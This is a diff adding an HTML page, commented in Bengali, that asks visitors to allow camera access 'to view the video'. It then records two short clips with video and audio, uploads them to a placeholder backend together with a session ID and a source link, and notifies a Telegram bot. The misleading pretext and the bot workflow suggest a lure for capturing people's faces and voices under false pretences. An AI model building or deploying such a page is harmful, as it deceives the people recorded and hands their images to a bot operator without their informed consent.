@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Recorder</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; }
+        video { width: 90%; max-width: 500px; border: 2px solid #333; margin-top: 20px; }
+        button { padding: 15px 30px; font-size: 18px; margin: 20px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 5px; }
+        button:disabled { background: #ccc; }
+        #status { margin-top: 20px; font-weight: bold; color: #333; }
+    </style>
+</head>
+<body>
+
+    <h2>Camera Access Required</h2>
+    <p>Please allow camera access to view the video.</p>
+    
+    <video id="preview" autoplay playsinline muted></video>
+    <br>
+    <button id="startBtn">Start Recording (4s + 4s)</button>
+    <div id="status"></div>
+
+    <script>
+        // URL থেকে session ID এবং source link নেওয়া
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        const sourceLink = urlParams.get('source_link');
+        
+        // আপনার Render App এর API Endpoint (Python backend er URL)
+        const API_URL = "https://your-render-app-url.onrender.com/upload"; 
+        // Note: Render এ Free Tier হলে Cold Start হতে ১-২ মিনিট লাগতে পারে।
+
+        const videoElement = document.getElementById('preview');
+        const startBtn = document.getElementById('startBtn');
+        const statusDiv = document.getElementById('status');
+
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // ক্যামেরা এক্সেস করা
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                videoElement.srcObject = stream;
+                statusDiv.innerText = "Camera Ready. Click Start.";
+            } catch (err) {
+                statusDiv.innerText = "Error accessing camera: " + err.message;
+                console.error(err);
+            }
+        }
+
+        // রেকর্ডিং লজিক
+        startBtn.addEventListener('click', async () => {
+            if (!videoElement.srcObject) return;
+
+            startBtn.disabled = true;
+            statusDiv.innerText = "Recording First Video (4 seconds)...";
+
+            const stream = videoElement.srcObject;
+            
+            // প্রথম ভিডিও রেকর্ড (৪ সেকেন্ড)
+            await recordAndSave(stream, 4000, 1);
+        });
+
+        async function recordAndSave(stream, durationMs, attempt) {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream);
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.start();
+
+            // নির্দিষ্ট সময় পর থামানো
+            await new Promise(resolve => setTimeout(resolve, durationMs));
+            
+            mediaRecorder.stop();
+            
+            // রেকর্ডিং শেষ হওয়ার অপেক্ষা করা
+            await new Promise(resolve => mediaRecorder.onstop = resolve);
+
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            statusDiv.innerText = `Video ${attempt} Recorded. Uploading...`;
+
+            // API তে আপলোড করা
+            await uploadToServer(blob, sessionId, attempt);
+        }
+
+        async function uploadToServer(blob, session, attempt) {
+            const formData = new FormData();
+            formData.append('file', blob, `video_attempt_${attempt}.webm`);
+            formData.append('session_id', session);
+            formData.append('source_link', sourceLink || '');
+
+            try {
+                // আপনার Render App এর URL এ POST request পাঠানো হচ্ছে
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    
+                    if (attempt === 1) {
+                        // প্রথম ভিডিও আপলোড হলে দ্বিতীয়টি রেকর্ড করতে বলা
+                        statusDiv.innerText = "First video sent. Recording Second Video (4 seconds)...";
+                        await recordAndSave(videoElement.srcObject, 4000, 2);
+                    } else {
+                        // দুটোই শেষ হলে
+                        statusDiv.innerText = "Done! Sending data to Bot...";
+                        // এখানে আপনি বটকে একটি মেসেজ পাঠাতে পারেন যে কাজ শেষ হয়েছে
+                        // অথবা সরাসরি বটের API কল করতে পারেন
+                        await fetch(`https://api.telegram.org/botYOUR_TOKEN/sendMessage`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: session.split('_')[0], // User ID from session
+                                text: "✅ Done! 2 Videos Recorded and Sent."
+                            })
+                        });
+                    }
+                } else {
+                    statusDiv.innerText = "Upload failed.";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.innerText = "Network Error. Check Console.";
+            }
+        }
+
+        // পেজ লোড হলে ক্যামেরা শুরু করা
+        startCamera();
+    </script>
+</body>
+</html>
